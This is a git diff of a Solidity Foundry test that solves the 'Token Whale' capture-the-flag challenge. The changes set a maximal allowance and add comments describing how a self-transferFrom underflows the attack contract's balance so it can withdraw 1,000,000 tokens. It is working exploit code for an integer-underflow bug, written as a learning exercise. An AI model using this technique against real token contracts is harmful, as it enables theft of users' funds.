@@ -30,12 +30,15 @@ contract TokenWhaleTest is Test {
         /*
          * Goal: Find a way to accumulate at least 1,000,000 tokens to solve this challenge.
          * The idea here is to create a hack contract
-         * We will approve the contract address an allowance of 1e18
+         * We will approve the contract address an allowance of 2 ** 256 - 1
+         * -> allowance[attacker][tokenWhaleHack] >= value check
+         * ->  underflows the tokenWhaleHack’s balance
+         * -> balanceOf[msg.sender] -= value <=> balanceOf[tokenWhaleHack] = 0 - 1 = 2^256 - 1 in the _transfer helper function
          * In the exploit,transfer from msg.sender to msg.sender 1
          * Then make a transfer of 1_000_000
          */
         TokenWhaleHack tokenWhaleHack = new TokenWhaleHack(levelAddress);
-        tokenWhale.approve(address(tokenWhaleHack), 1e18); // 1 ** 18
+        tokenWhale.approve(address(tokenWhaleHack), 2 ** 256 -1 );
         tokenWhaleHack.exploit();
 
         /*****************
@@ -56,6 +59,7 @@ contract TokenWhaleHack {
 
     function exploit() public {
         unchecked {
+            // overflow exploit possible
             tokenWale.transferFrom(msg.sender, msg.sender, 1);
             require(tokenWale.balanceOf(address(this)) >= 1000000);
             tokenWale.transfer(msg.sender, 1000000);
